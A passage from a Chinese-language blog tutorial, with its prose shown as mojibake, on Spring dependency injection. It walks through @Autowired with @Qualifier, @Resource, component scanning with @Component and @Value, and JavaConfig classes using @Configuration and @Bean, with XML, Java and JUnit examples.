data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172336677.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ—¢ç„¶å®ƒæä¾›äº†è¿™ä¹ˆå¤šæ–¹æ³•å»å®ç°ï¼Œè‚¯å®šæ˜¯æ¯ä¸ªæ–¹æ³•éƒ½æ˜¯å„è‡ªæœ‰ç”¨å¤„çš„ï¼Œä¹Ÿå„æœ‰å„çš„å¥½å</p><p>åœ¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆå¾—åœ¨ beanxml æ–‡ä»¶ä¸­æ‰“ä¸Šçº¦æŸï¼Œå®˜æ–¹æ–‡æ¡£æœ‰å…·ä½“çš„å†…å®¹ï¼Œè¿™é‡Œæ˜¯æˆ‘è‡ªå·±çš„çº¦æŸ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line">       xmlns:c=&quot;http://www.springframework.org/schema/c&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">        https://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">        http://www.springframework.org/schema/context</span><br><span class="line">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹å°±æ˜¯ä¸€ä¸ª <code>xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</code> </p><p>ä»¥åŠä¸¤ä¸ªï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.springframework.org/schema/context</span><br><span class="line">https://www.springframework.org/schema/context/spring-context.xsd</span><br></pre></td></tr></table></figure><p>å¯¼å…¥å®Œçº¦æŸä¹‹åï¼Œè¿˜éœ€è¦é…ç½®æ³¨è§£çš„æ”¯æŒï¼Œå…¶å®å°±æ˜¯åœ¨æ‰“å®Œçº¦æŸä¹‹åï¼Œå†åœ¨ beans æ ‡ç­¾å†…åŠ ä¸Šä¸€æ®µ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1x01-Autowired-æ³¨è§£"><a href="#1x01-Autowired-æ³¨è§£" class="headerlink" title="1x01 @Autowired æ³¨è§£"></a>1x01 @Autowired æ³¨è§£</h4><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†ä¿®æ”¹ä¸€ä¸‹ xmlï¼Œåªç•™ä¸‹æœ€åŸºæœ¬çš„å¯¹è±¡æ³¨å†Œ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;person&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.stoocea.Pojo.Person&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨ Person ç±»ä¸­å†™ä¸€ä¸‹è‡ªåŠ¨é…ç½®çš„æ³¨è§£ <code>@Autowired</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Peroson&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">        <span class="string">&quot;, cat=&quot;</span> + cat +</span><br><span class="line">        <span class="string">&quot;, dog=&quot;</span> + dog +</span><br><span class="line">        <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//setå’Œgetæ–¹æ³•ä»¥åŠtoStringæ–¹æ³•çš„å†…å®¹......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°ä»–åœ¨ç±»ä¸­ç¡®å®æœ‰äº†è¢«è£…é…çš„æ ‡å¿—ï¼Œç„¶åå» test æµ‹è¯•ä¸€ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172441942.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172441942.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¾æ—§æˆåŠŸ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172452508.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172452508.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>@Autowired</code>çš„å®ç°ç”šè‡³éƒ½ä¸éœ€è¦çš„ set æ–¹æ³•ï¼Œåªéœ€è¦åœ¨ IOC å®¹å™¨ä¸­å­˜åœ¨</p><p><code>@Autowired</code>å…¶å®é çš„å°±æ˜¯ byname çš„æ–¹å¼åœ¨ IOC å®¹å™¨å¯»æ‰¾åŒå beanï¼Œç„¶åè¿›è¡Œè£…é…ï¼Œåªä¸è¿‡å®ƒçš„ byname æ–¹æ³•æ¯”è¾ƒæ™ºèƒ½ï¼Œå³ä½¿ IOC å®¹å™¨ä¸­çš„ç›®æ ‡ bean çš„ id ä¸è·Ÿå±æ€§å€¼ç›¸åŒï¼Œä¹Ÿèƒ½å¤Ÿå®ç°è£…é…ï¼Œä½†æ˜¯ä¸æ˜¯å¦‚æœä¸æ˜¯å”¯ä¸€çš„ bean å°±ä¸è¡Œäº†</p><p>æ‰€ä»¥<code>@Autowired</code>è¿™ä¸ªæ—¶å€™ä¸€èˆ¬æ˜¯å’Œå¦å¤–ä¸€ä¸ªæ³¨è§£è”åˆä½¿ç”¨â€”- <code>*@Qualifier*</code><em>ï¼Œ</em>å®ƒç”¨æ¥æŒ‡å®šè‡ªåŠ¨è£…é…æ—¶ï¼Œå…·ä½“åˆ°åº•æ˜¯å“ªä¸€ä¸ª bean</p><p>å‡å¦‚æˆ‘ä»¬æ­¤æ—¶åŒç±»çš„ bean1 æœ‰ä¸¤ä¸ª dog2222 å’Œ dog222 </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172503590.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172503590.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç„¶å Qualifier æŒ‡å®šæ˜¯è£…é… id ä¸º dog222 çš„ bean </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image.webp" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172559057.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172559057.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†å…¶å® java è‡ªå¸¦ä¸€ä¸ªæ³¨è§£æ›´åŠ æ™ºèƒ½ï¼Œå®ƒä¼šå…ˆåœ¨ IOC å®¹å™¨ä¸­ byname æœç´¢ï¼Œç„¶åå† bytype æœç´¢</p><p>ä¸€èˆ¬è¦ä½¿ç”¨çš„è¯ä¹Ÿæ˜¯ç›´æ¥å†™åœ¨å±æ€§åä¸Šé¢ï¼Œæˆ–è€… set æ–¹æ³•çš„ä¸Šé¢ï¼Œä½†æ˜¯ JDK é«˜ç‰ˆæœ¬å°±æ²¡æœ‰äº†ï¼Œæœ¬èº«@Autowired ä¹Ÿå¤Ÿç”¨äº†ï¼Œå¹¶ä¸”ä¹Ÿæœ‰Qualifier è¾…åŠ©å…¶ä½¿ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Resource</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPeople</span><span class="params">(People people)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.people = people;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-Spring-æ³¨è§£å¼€å‘"><a href="#6-Spring-æ³¨è§£å¼€å‘" class="headerlink" title="6 Spring æ³¨è§£å¼€å‘"></a>6 Spring æ³¨è§£å¼€å‘</h2><p>æ³¨è§£å¼€å‘çš„å†…å®¹å·²ç»æ¥è§¦è¿‡äº†ï¼Œä¸Šé¢çš„æ³¨è§£è‡ªåŠ¨è£…é…å±æ€§å°±æ˜¯å…¶ä¸­ä¸€ç§ï¼Œä½†å…¶å® Spring çš„æ³¨è§£è¿˜æœ‰å¾ˆå¤šçš„å†…å®¹</p><h3 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01 ç¯å¢ƒæ­å»º"></a>0x01 ç¯å¢ƒæ­å»º</h3><p>æ–°å»ºä¸€ä¸ª moudleï¼Œç„¶åé¡¹ç›®ç»“æ„ä¸å˜ï¼Œbeanxml æ–‡ä»¶åŒ…æ‹¬è¿›æ¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.stoocea&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¤šäº†ä¸€è¡Œå†…å®¹ <code>&lt;context:component-scan base-package=&quot;com.stoocea.Pojo&quot;/&gt;</code> componentâ€”è£…é…æ‰«æå™¨ï¼Œä»–ä¼šå¾€æŒ‡å®šçš„ç›®å½•ä¸­æ‰«ææ³¨è§£ï¼Œåªè¦æœ‰<code>@Component</code>æ³¨è§£åœ¨ä¸Šçš„ç±»ï¼Œå°±ä¼šè¢«è¯†åˆ«ï¼Œè£…å…¥ IOC å®¹å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç°åœ¨è¿˜æ²¡æœ‰å¯¹å…¶å±æ€§å€¼è¿›è¡Œè£…é…ï¼Œè¿™é‡Œæˆ‘ä»¬é…åˆå¦ä¸€ä¸ªæ³¨è§£ <code>@Value</code>è¿›è¡Œå®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;stoocea&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"><span class="comment">//setå’Œgetï¼Œä»¥åŠtoString....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Component æ³¨è§£ä¸­æœ‰ä¸€ä¸ªå‚æ•°ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172621728.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172621728.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>value ç”¨æ¥èµ· IOC å®¹å™¨ä¸­çš„ id</p><p>å½“ç„¶è¿™è¦æ˜¯ç®€å•ç±»å‹è‚¯å®šéšä¾¿ç©ï¼ŒçœŸæ­£å¤æ‚èµ·æ¥ï¼Œè‚¯å®šè¿˜æ˜¯ xml æ–‡ä»¶çš„ DIï¼Œæ‰€ä»¥æ³¨è§£å’Œ DI è¦ç»“åˆç€ä½¿ç”¨</p><p>æ ¹æ®ä¹‹åçš„ SpringMVC ä¸‰å±‚åˆ†å±‚ï¼Œ<code>@Component</code>æ³¨è§£è¡ç”Ÿå‡ºäº†å„è‡ªå±‚çš„æ³¨è§£</p><ul><li>Dao å±‚ï¼š<code>*@Repository*</code></li><li>Controller å±‚ï¼š <code>@Controller</code></li><li>Service å±‚ï¼š<code>@Service</code></li></ul><p>å››è€…çš„ä½œç”¨éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå°†å¯¹åº”çš„ç±»æ³¨å†Œè¿› IOC å®¹å™¨</p><h3 id="0x02-ä½¿ç”¨-JavaConfig-å®ç°é…ç½®"><a href="#0x02-ä½¿ç”¨-JavaConfig-å®ç°é…ç½®" class="headerlink" title="0x02 ä½¿ç”¨ JavaConfig å®ç°é…ç½®"></a>0x02 ä½¿ç”¨ JavaConfig å®ç°é…ç½®</h3><p>Spring é«˜ç‰ˆæœ¬ä¹‹åçš„ bean ç®¡ç†éƒ½æ˜¯é€šè¿‡ javaconfig ç±»æ¥å®ç°ï¼Œxml æ–‡ä»¶å‡ ä¹å¯ä»¥ä¸ç”¨äº†</p><p>å¦‚ä½•æŒ‡å®š JavaConfig ç±»å‘¢ï¼Œé€šè¿‡<code>@Configuration</code>æ³¨è§£å®ç°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Config;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StooceaConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>@Configuration</code>å…¶å®ç›¸å½“äºä¹‹å‰é…ç½®æ–‡ä»¶ä¸­çš„<code>&lt;beans&gt;</code>æ ‡ç­¾ï¼Œè€Œ JavaConfig ç±»ä¸­çš„<code>@Bean</code>æ³¨è§£ä¸‹é¢æ‰€å¯¹åº”çš„å†…å®¹å°±æ˜¯ç›¸å½“äº<code>&lt;bean&gt;</code>ï¼Œè€Œ<code>@Bean</code>æ–¹æ³•çš„åå­—å°±ç›¸å½“äº IOC å®¹å™¨ä¸­çš„ id å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.*;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Config.StooceaConfig;</span><br><span class="line"><span class="keyword">import</span> javax.management.modelmbean.XMLParseException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Mytest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testUser</span><span class="params">()</span> &#123;</span><br><span class="line">        ApplicationContext context=<span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(StooceaConfig.class);</span><br><span class="line">        User user=context.getBean(<span class="string">&quot;getUser&quot;</span>, User.class);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿèƒ½å¤Ÿæ­£å¸¸è·å–åˆ°ï¼Œå¹¶ä¸”æˆ‘ä»¬å…¨ç¨‹æ²¡æœ‰ä½¿ç”¨é…ç½®æ–‡ä»¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172634822.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172634822.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é‡Œæˆ‘ä»¬å†å¤šåšä¸€ä¸ªä¾‹å­</p><p>JavaConfig ä¸­æ³¨å†Œä¸¤ä¸ª bean User å’Œchinesepeople è¿› IOC å®¹å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Config;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.ChinesePeople;</span><br><span class="line"><span class="keyword">import</span> com.stoocea.Pojo.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.stoocea&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StooceaConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ChinesePeople <span class="title function_">chinesepeople</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ChinesePeople</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹ä¸€ä¸‹ä¸¤è€…çš„å…·ä½“å†…å®¹ï¼š</p><p>å®šä¹‰äº†ä¸€ä¸ª Chinesepeople ç±»ï¼Œç„¶ååœ¨ User ç±»ä¸­åˆ©ç”¨è‡ªåŠ¨ä¸“é… <code>@Autowired</code>å’Œ<code>@Qualifier</code>å°† people å±æ€§èµ‹å€¼ä¸º chinesepeople ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChinesePeople</span> <span class="keyword">implements</span> <span class="title class_">People</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;i am chinese man&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.stoocea.Pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;stoocea&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(value = &quot;chinesepeople&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> People people;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>&#123;</span><br><span class="line">        people.say();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åæµ‹è¯•ä¸€ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172649598.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013172649598.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶å® User ç±»å’Œ chinesepeople ç±»ä¸­ä¹Ÿå¯ä»¥ä¸å†™ Component æ³¨è§£ï¼Œjavaconfig ä¸­å°±å·²ç»å°†ä¸¤è€…ç»™æ³¨å†Œäº†</p><p>ä½†å…¶å®ä¸¤è€…è¿˜æ˜¯æœ‰åŒºåˆ«çš„ï¼Œå¦‚æœç›´æ¥åœ¨ç±»ä¸ŠåŠ æ³¨è§£ <code>@Component</code>,è¯¥ bean çš„ä½œç”¨åŸŸæ˜¯ 